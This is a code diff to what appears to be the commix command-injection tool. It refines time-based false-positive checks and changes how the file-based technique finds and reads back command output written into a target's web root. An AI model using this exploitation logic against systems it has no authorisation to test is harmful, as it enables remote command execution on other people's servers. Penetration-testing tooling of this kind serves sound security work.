@@ -1182,9 +1182,18 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
         (payloads.condition_check(separator, str(a) + " -eq " + str(c), timesec, http_request_method), None),  # discarded - lets the backend settle after any earlier delay
         (payloads.condition_check(separator, str(a) + " -eq " + str(b), timesec, http_request_method), False),
         (payloads.condition_check(separator, str(b) + " -eq " + str(c), timesec, http_request_method), False),
-        (payloads.condition_check(separator, str(b) + " " + str(c), timesec, http_request_method), False),  # not a valid test expression
-        (payloads.condition_check(separator, str(c) + " -eq " + str(c), timesec, http_request_method), True),
       ]
+      """
+      An expression the shell cannot evaluate is a control only where the gating skips on error.
+
+      A malformed '[' exits 2, and these separators reach their delay through '||', which runs on
+      any non-zero status - so the control would delay by construction, and condemn as a false
+      positive every point it was meant to confirm.
+      """
+      if separator not in (settings.PIPE_SEPARATOR, "||"):
+        litmus_checks.append((payloads.condition_check(separator, str(b) + settings.SINGLE_WHITESPACE + str(c), timesec, http_request_method), False))  # not a valid test expression
+      # Ends on a must-delay check; the caller re-validates the final exec_time.
+      litmus_checks.append((payloads.condition_check(separator, str(c) + " -eq " + str(c), timesec, http_request_method), True))
     verified = True
     for payload, expect in litmus_checks:
       if payload is None:
@@ -1372,6 +1381,7 @@ def injection_output(url, OUTPUT_TEXTFILE, timesec, technique):
       if not settings.DEFINED_WEBROOT or (settings.MULTI_TARGETS and not settings.RECHECK_FILE_FOR_EXTRACTION):
         if settings.MULTI_TARGETS:
           settings.RECHECK_FILE_FOR_EXTRACTION = True
+        refusals = 0
         while True:
           message =  "Do you want to use the URL '" + output
           message += "' to receive the execution output? [Y/n] "
@@ -1383,9 +1393,22 @@ def injection_output(url, OUTPUT_TEXTFILE, timesec, technique):
             message =  "Enter URL to receive "
             message += "the execution output "
             message = common.read_input(message, default=output, check_batch=True)
+            # A path on the target answers the question as well as the whole URL does, and is what
+            # a sink serving the file through a script is most naturally named by.
+            if message.startswith("/"):
+              target = _urllib.parse.urlparse(url)
+              message = target.scheme + "://" + target.netloc + message
             if not re.search(r'^(?:http)s?://', message, re.I):
               common.invalid_option(message)
-              pass
+              # An answer that cannot change is an answer that cannot be asked for again: a run
+              # that is not being watched, or one answering from '--answers', would otherwise be
+              # put the same question for as long as it is left alone.
+              refusals += 1
+              if refusals >= settings.MAX_INVALID_URL_ANSWERS:
+                err_msg = "The URL to receive the execution output must start with 'http://' or "
+                err_msg += "'https://', and '" + str(message) + "' does not."
+                settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+                raise SystemExit()
             else:
               output = settings.DEFINED_WEBROOT = message
               info_msg = "Using '" + output
@@ -1413,6 +1436,65 @@ def injection_output(url, OUTPUT_TEXTFILE, timesec, technique):
     settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
 
   return output
+
+"""
+Every URL the written file could be reachable at, the one already settled on first.
+
+A web root says where the file lands on disk, not where that is on the site - the directories
+between the document root and it are not in it to be read. Rather than guess which of them the
+document root ends at, each is tried in turn, starting with the shallowest.
+"""
+def output_file_candidates(output, url, OUTPUT_TEXTFILE):
+  candidates = [output]
+  if menu.options.web_root:
+    parsed = _urllib.parse.urlparse(url)
+    parts = [part for part in menu.options.web_root.replace("\\", "/").split("/") if part]
+    for depth in range(1, len(parts) + 1):
+      candidate = parsed.scheme + "://" + parsed.netloc + "/" + "/".join(parts[-depth:]) + "/" + OUTPUT_TEXTFILE
+      if candidate not in candidates:
+        candidates.append(candidate)
+  return candidates
+
+"""
+The response holding the written file, from whichever URL it turns out to be reachable at.
+"""
+def fetch_output_response(url, OUTPUT_TEXTFILE, timesec, technique):
+  output = injection_output(url, OUTPUT_TEXTFILE, timesec, technique)
+  for candidate in output_file_candidates(output, url, OUTPUT_TEXTFILE):
+    try:
+      response = checks.get_response(candidate)
+    except (_urllib.error.HTTPError, _urllib.error.URLError):
+      continue
+    if type(response) is bool or response is None:
+      continue
+    if candidate != output:
+      # Settled here, so the rest of the run asks for the one that answered rather than trying again.
+      settings.DEFINED_WEBROOT = candidate
+      info_msg = "Reading the execution output from '" + candidate + "'."
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    return response
+  # The command may well have run and written its output - what could not be done is read it back,
+  # which is a different thing to say than that nothing came of the command.
+  warn_msg = "The execution output could not be read at '" + output + "'. "
+  warn_msg += "The file is written where '--web-root' says, so what is needed is the URL that serves it."
+  settings.print_once(warn_msg)
+  return None
+
+"""
+What the written file holds, or nothing where it cannot be read.
+"""
+def read_output_file(output):
+  try:
+    response = checks.get_response(output)
+    if type(response) is bool and response is not True or response is None:
+      return ""
+    shell = checks.process_page_content(response, action="encode").rstrip().lstrip()
+    if settings.TARGET_OS == settings.OS.WINDOWS:
+      shell = [newline.replace(settings.END_LINE.CR, "") for newline in shell]
+      shell = [empty for empty in shell if empty]
+    return shell
+  except (_urllib.error.HTTPError, _urllib.error.URLError):
+    return ""
 
 """
 Evaluate test results.
@@ -1532,19 +1614,20 @@ def injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, times
 
   else:
     #Find the directory.
-    output = injection_output(url, OUTPUT_TEXTFILE, timesec, technique)
-    try:
-      response = checks.get_response(output)
-      if type(response) is bool and response is not True or response is None:
-        shell = ""
-      else:
+    shell = ""
+    for attempt in range(settings.MAX_OUTPUT_FILE_READS):
+      response = fetch_output_response(url, OUTPUT_TEXTFILE, timesec, technique)
+      if response is not None:
         shell = checks.process_page_content(response, action="encode").rstrip().lstrip()
         if settings.TARGET_OS == settings.OS.WINDOWS:
           shell = [newline.replace(settings.END_LINE.CR, "") for newline in shell]
           shell = [empty for empty in shell if empty]
-    except (_urllib.error.HTTPError, _urllib.error.URLError) as e:
-      if str(e.getcode()) == settings.NOT_FOUND_ERROR:
-        shell = ""
+      # What the file held before this command is what it still holds if the write has not landed.
+      if shell and shell != settings.LAST_OUTPUT_FILE_CONTENT:
+        break
+      if attempt + 1 < settings.MAX_OUTPUT_FILE_READS:
+        time.sleep(settings.OUTPUT_FILE_READ_DELAY)
+    settings.LAST_OUTPUT_FILE_CONTENT = shell
 
   return shell
 # eof
